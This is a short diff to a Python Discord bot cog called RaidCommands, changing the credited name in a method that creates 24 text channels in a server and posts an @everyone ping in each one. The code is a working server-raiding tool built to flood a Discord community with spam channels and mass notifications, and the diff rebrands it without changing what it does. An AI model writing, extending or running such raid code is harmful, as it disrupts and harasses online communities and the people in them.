@@ -65,7 +65,7 @@ class RaidCommands(commands.Cog):
     async def create_channels_and_ping(self, ctx):
         for _ in range(24):
             try:
-                new_channel = await ctx.guild.create_text_channel("Raid By Atom")
+                new_channel = await ctx.guild.create_text_channel("Raid By PolyBius")
                 await new_channel.send("# ez_       _ ||@everyone||")
             except Exception as e:
                 print(f"Failed to create channel or ping @everyone: {e}")
